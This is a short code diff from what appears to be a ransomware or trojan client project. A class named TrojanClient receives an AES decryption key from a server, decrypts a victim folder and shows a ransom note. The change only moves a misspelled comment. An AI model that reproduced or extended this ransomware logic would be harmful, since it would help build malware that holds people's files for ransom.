@@ -154,8 +154,10 @@ class TrojanClient:
         if (msg_decode != "sending decryption key"):
             raise ValueError("unexpected message")
 
-        #decrepption
+
         aes_key = protocol.receive(self.connection)
+
+        #decrepption
         FileEncryptor.decrypt_folder(self.folder, aes_key)
         del aes_key
         RansomNote.display_decryption_note()
